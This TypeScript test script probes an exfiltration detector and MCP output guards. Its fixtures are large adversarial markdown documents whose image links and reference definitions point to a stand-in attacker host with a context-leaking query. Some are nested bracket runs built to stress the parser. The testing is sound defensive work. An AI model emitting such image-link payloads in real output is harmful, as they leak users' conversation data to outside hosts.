// T82 — the four public boundaries at megabyte scale, one shape per process, and
// the semantics of the work budget when it is exhausted.
//
//   bun T82-boundary.ts <shape> <targetBytes>   -- four boundaries, one shape
//   bun T82-boundary.ts budget                  -- exhaustion must FLAG, not release
//
// Read-only, offline, synthetic/reserved hosts only.
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "https://ok.example.org/safe.png";

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

// Build a document of approximately `bytes` for the named shape.
function build(shape: string, bytes: number): string {
  switch (shape) {
    case "bangOpenRun_bracketKey": {
      const k = Math.floor(bytes / 4);
      return "![".repeat(Math.floor(bytes / 4)) + "]" + `\n\n[${"[".repeat(k)}]: ${U}\n`;
    }
    case "bangBalancedNest_bracketKey": {
      const n = Math.floor(bytes / 6);
      return "![".repeat(n) + "]".repeat(n) + `\n\n[${"[".repeat(n)}]: ${U}\n`;
    }
    case "bangRunManyCloses_bracketKey": {
      const n = Math.floor(bytes / 10);
      return "![[a]".repeat(n) + `\n\n[${"[".repeat(n)}]: ${U}\n`;
    }
    case "bangFullRef_bracketKey": {
      const n = Math.floor(bytes / 10);
      return "![d][".repeat(n) + "]" + `\n\n[${"[".repeat(n)}]: ${U}\n`;
    }
    case "balancedNest_withLongDef": {
      const n = Math.floor((bytes - 20030) / 2);
      return "[".repeat(n) + "]".repeat(n) + `\n\n[${"L".repeat(20000)}]: ${U}\n`;
    }
    case "resolvingBangUses": {
      const n = Math.floor(bytes / 4);
      return "![k]".repeat(n) + `\n\n[k]: ${U}\n`;
    }
    case "prose": {
      const para = "Lorem ipsum dolor sit amet, consectetur [adipiscing] elit sed do eiusmod. ";
      return para.repeat(Math.floor(bytes / para.length)) + `\n\n[${"A sentence shaped label ".repeat(200)}]: ${U}\n`;
    }
    case "htmlImgRun": {
      const unit = `<img src="${U}">`;
      return unit.repeat(Math.floor(bytes / unit.length));
    }
    case "inlineNoCloseParen":
      return "[a](".repeat(Math.floor(bytes / 4));
    default:
      throw new Error(`unknown shape ${shape}`);
  }
}

const mode = process.argv[2] ?? "budget";

if (mode === "budget") {
  // The failure direction of part 3: exhausting the work budget must FLAG every
  // reference definition, never release one. And the allowlist must still apply.
  const n = 60000;
  const doc = (defUrl: string) =>
    "![".repeat(n) + "]" + `\n\n[${"[".repeat(n)}]: ${defUrl}\n[second]: ${defUrl}?b\n`;
  const attacker = doc(U);
  const allowed = doc(OK);
  // a document that does NOT exhaust the budget, for contrast
  const small = `![a]\n\n[a]: ${U}\n[unused]: ${U}?u\n`;
  console.log(
    JSON.stringify(
      {
        probe: "T82-boundary/budget",
        exhausting: {
          bytes: attacker.length,
          findings: detectExfil(attacker, []).length,
          maskedValues: detectExfil(attacker, []).map((m) => String(m.value)),
        },
        exhaustingAllowlisted: {
          bytes: allowed.length,
          findingsNoAllowlist: detectExfil(allowed, []).length,
          findingsAllowlisted: detectExfil(allowed, ["ok.example.org"]).length,
        },
        nonExhausting: {
          bytes: small.length,
          findings: detectExfil(small, []).length,
          maskedValues: detectExfil(small, []).map((m) => String(m.value)),
        },
      },
      null,
      2,
    ),
  );
} else {
  const shape = mode;
  const target = Number(process.argv[3] ?? 1048576);
  const text = build(shape, target);
  const serialized = JSON.stringify({ note: text });
  const cwd = process.cwd();
  const ctx: McpContext = {
    cwd,
    config: mergeMcpConfig({ redactToolOutput: false }),
    discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
    transport: "in-process",
    tools: [
      {
        name: "p.x",
        module: "standard" as const,
        description: "x",
        inputSchema: { type: "object" },
        mutating: false,
        invoke: async () => ({ note: text }),
      },
    ],
  };

  async function best(fn: () => Promise<unknown> | unknown): Promise<number> {
    let m = Infinity;
    for (let i = 0; i < 3; i += 1) {
      const t0 = performance.now();
      await fn();
      m = Math.min(m, performance.now() - t0);
    }
    return Math.round(m * 10) / 10;
  }

  const detector = await best(() => detectExfil(text, []));
  const mcp = await best(() => dispatchCallTool(ctx, "p.x", {}));
  const persist = await best(() => prepareOutputForPersistence(pass, serialized));
  const transport = await best(() => validateOutputForTransport({ value: { note: text }, format: "json" }));
  const seam = await best(() => redactToolOutput(cwd, serialized));
  const call = await dispatchCallTool(ctx, "p.x", {});
  console.log(
    JSON.stringify({
      shape,
      bytes: text.length,
      detectorMs: detector,
      dispatchCallToolMs: mcp,
      prepareOutputForPersistenceMs: persist,
      validateOutputForTransportMs: transport,
      redactToolOutputMs: seam,
      worstMs: Math.max(mcp, persist, transport, seam),
      overOneSecond: Math.max(mcp, persist, transport, seam) > 1000,
      mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
      mcpLeaksAttacker: JSON.stringify(call).includes(ATT),
    }),
  );
}
